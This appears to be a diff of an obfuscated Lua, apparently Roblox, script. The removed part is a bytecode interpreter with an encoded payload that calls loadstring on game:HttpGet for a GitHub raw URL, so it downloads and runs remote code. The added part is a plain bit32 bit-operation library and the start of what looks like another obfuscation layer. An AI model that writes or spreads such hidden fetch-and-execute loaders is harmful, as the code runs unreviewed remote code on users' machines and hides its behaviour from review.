@@ -39,264 +39,110 @@
 
 
 
-local StrToNumber = tonumber;
-local Byte = string.byte;
-local Char = string.char;
-local Sub = string.sub;
-local Subg = string.gsub;
-local Rep = string.rep;
-local Concat = table.concat;
-local Insert = table.insert;
-local LDExp = math.ldexp;
-local GetFEnv = getfenv or function()
-	return _ENV;
+
+
+bit32 = {};
+local N = 32;
+local P = 2 ^ N;
+bit32.bnot = function(x)
+	x = x % P;
+	return (P - 1) - x;
 end;
-local Setmetatable = setmetatable;
-local PCall = pcall;
-local Select = select;
-local Unpack = unpack or table.unpack;
-local ToNumber = tonumber;
-local function VMCall(ByteString, vmenv, ...)
-	local DIP = 1;
-	local repeatNext;
-	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
-		if (Byte(byte, 2) == 79) then
-			repeatNext = StrToNumber(Sub(byte, 1, 1));
-			return "";
-		else
-			local a = Char(StrToNumber(byte, 16));
-			if repeatNext then
-				local b = Rep(a, repeatNext);
-				repeatNext = nil;
-				return b;
-			else
-				return a;
-			end
+bit32.band = function(x, y)
+	if (y == 255) then
+		return x % 256;
+	end
+	if (y == 65535) then
+		return x % 65536;
+	end
+	if (y == 4294967295) then
+		return x % 4294967296;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 2) then
+			r = r + p;
 		end
-	end);
-	local function gBit(Bit, Start, End)
-		if End then
-			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
-			return Res - (Res % 1);
-		else
-			local Plc = 2 ^ (Start - 1);
-			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bor = function(x, y)
+	if (y == 255) then
+		return (x - (x % 256)) + 255;
+	end
+	if (y == 65535) then
+		return (x - (x % 65536)) + 65535;
+	end
+	if (y == 4294967295) then
+		return 4294967295;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) >= 1) then
+			r = r + p;
 		end
+		p = 2 * p;
 	end
-	local function gBits8()
-		local a = Byte(ByteString, DIP, DIP);
-		DIP = DIP + 1;
-		return a;
-	end
-	local function gBits16()
-		local a, b = Byte(ByteString, DIP, DIP + 2);
-		DIP = DIP + 2;
-		return (b * 256) + a;
-	end
-	local function gBits32()
-		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
-		DIP = DIP + 4;
-		return (d * 16777216) + (c * 65536) + (b * 256) + a;
-	end
-	local function gFloat()
-		local Left = gBits32();
-		local Right = gBits32();
-		local IsNormal = 1;
-		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
-		local Exponent = gBit(Right, 21, 31);
-		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
-		if (Exponent == 0) then
-			if (Mantissa == 0) then
-				return Sign * 0;
-			else
-				Exponent = 1;
-				IsNormal = 0;
-			end
-		elseif (Exponent == 2047) then
-			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
+	return r;
+end;
+bit32.bxor = function(x, y)
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 1) then
+			r = r + p;
 		end
-		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
+		p = 2 * p;
 	end
-	local function gString(Len)
-		local Str;
-		if not Len then
-			Len = gBits32();
-			if (Len == 0) then
-				return "";
-			end
-		end
-		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
-		DIP = DIP + Len;
-		local FStr = {};
-		for Idx = 1, #Str do
-			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
-		end
-		return Concat(FStr);
+	return r;
+end;
+bit32.lshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
 	end
-	local gInt = gBits32;
-	local function _R(...)
-		return {...}, Select("#", ...);
+	x = x % P;
+	if (s_amount < 0) then
+		return math.floor(x * (2 ^ s_amount));
+	else
+		return (x * (2 ^ s_amount)) % P;
 	end
-	local function Deserialize()
-		local Instrs = {};
-		local Functions = {};
-		local Lines = {};
-		local Chunk = {Instrs,Functions,nil,Lines};
-		local ConstCount = gBits32();
-		local Consts = {};
-		for Idx = 1, ConstCount do
-			local Type = gBits8();
-			local Cons;
-			if (Type == 1) then
-				Cons = gBits8() ~= 0;
-			elseif (Type == 2) then
-				Cons = gFloat();
-			elseif (Type == 3) then
-				Cons = gString();
-			end
-			Consts[Idx] = Cons;
-		end
-		Chunk[3] = gBits8();
-		for Idx = 1, gBits32() do
-			local Descriptor = gBits8();
-			if (gBit(Descriptor, 1, 1) == 0) then
-				local Type = gBit(Descriptor, 2, 3);
-				local Mask = gBit(Descriptor, 4, 6);
-				local Inst = {gBits16(),gBits16(),nil,nil};
-				if (Type == 0) then
-					Inst[3] = gBits16();
-					Inst[4] = gBits16();
-				elseif (Type == 1) then
-					Inst[3] = gBits32();
-				elseif (Type == 2) then
-					Inst[3] = gBits32() - (2 ^ 16);
-				elseif (Type == 3) then
-					Inst[3] = gBits32() - (2 ^ 16);
-					Inst[4] = gBits16();
-				end
-				if (gBit(Mask, 1, 1) == 1) then
-					Inst[2] = Consts[Inst[2]];
-				end
-				if (gBit(Mask, 2, 2) == 1) then
-					Inst[3] = Consts[Inst[3]];
-				end
-				if (gBit(Mask, 3, 3) == 1) then
-					Inst[4] = Consts[Inst[4]];
-				end
-				Instrs[Idx] = Inst;
-			end
-		end
-		for Idx = 1, gBits32() do
-			Functions[Idx - 1] = Deserialize();
-		end
-		return Chunk;
+end;
+bit32.rshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
 	end
-	local function Wrap(Chunk, Upvalues, Env)
-		local Instr = Chunk[1];
-		local Proto = Chunk[2];
-		local Params = Chunk[3];
-		return function(...)
-			local Instr = Instr;
-			local Proto = Proto;
-			local Params = Params;
-			local _R = _R;
-			local VIP = 1;
-			local Top = -1;
-			local Vararg = {};
-			local Args = {...};
-			local PCount = Select("#", ...) - 1;
-			local Lupvals = {};
-			local Stk = {};
-			for Idx = 0, PCount do
-				if (Idx >= Params) then
-					Vararg[Idx - Params] = Args[Idx + 1];
-				else
-					Stk[Idx] = Args[Idx + 1];
-				end
-			end
-			local Varargsz = (PCount - Params) + 1;
-			local Inst;
-			local Enum;
-			while true do
-				Inst = Instr[VIP];
-				Enum = Inst[1];
-				if (Enum <= 7) then
-					if (Enum <= 3) then
-						if (Enum <= 1) then
-							if (Enum > 0) then
-								local A = Inst[2];
-								Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
-							else
-								do
-									return;
-								end
-							end
-						elseif (Enum > 2) then
-							Stk[Inst[2]]();
-						else
-							Stk[Inst[2]] = Env[Inst[3]];
-						end
-					elseif (Enum <= 5) then
-						if (Enum > 4) then
-							Stk[Inst[2]]();
-						else
-							do
-								return;
-							end
-						end
-					elseif (Enum == 6) then
-						local A = Inst[2];
-						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
-					else
-						Stk[Inst[2]] = Inst[3] ~= 0;
-					end
-				elseif (Enum <= 11) then
-					if (Enum <= 9) then
-						if (Enum > 8) then
-							local A = Inst[2];
-							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							local Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-						else
-							local A = Inst[2];
-							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							local Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-						end
-					elseif (Enum > 10) then
-						Stk[Inst[2]] = Inst[3] ~= 0;
-					else
-						Stk[Inst[2]] = Inst[3];
-					end
-				elseif (Enum <= 13) then
-					if (Enum > 12) then
-						local A = Inst[2];
-						local B = Stk[Inst[3]];
-						Stk[A + 1] = B;
-						Stk[A] = B[Inst[4]];
-					else
-						local A = Inst[2];
-						local B = Stk[Inst[3]];
-						Stk[A + 1] = B;
-						Stk[A] = B[Inst[4]];
-					end
-				elseif (Enum == 14) then
-					Stk[Inst[2]] = Env[Inst[3]];
-				else
-					Stk[Inst[2]] = Inst[3];
-				end
-				VIP = VIP + 1;
-			end
-		end;
+	x = x % P;
+	if (s_amount > 0) then
+		return math.floor(x * (2 ^ -s_amount));
+	else
+		return (x * (2 ^ -s_amount)) % P;
 	end
-	return Wrap(Deserialize(), {}, vmenv)(...);
-end
-VMCall("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4153446570547261692F62756C6F6E656D6761692F6D61696E2F42754C6F6E456D47616900093O0012023O00013O001202000100023O00200D00010001000300120F000300044O0007000400014O0009000100044O00015O00022O00053O000100012O00043O00017O00", GetFEnv(), ...);
+end;
+bit32.arshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		local add = 0;
+		if (x >= (P / 2)) then
+			add = P - (2 ^ (N - s_amount));
+		end
+		return math.floor(x * (2 ^ -s_amount)) + add;
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+local TABLE_TableIndirection = {};
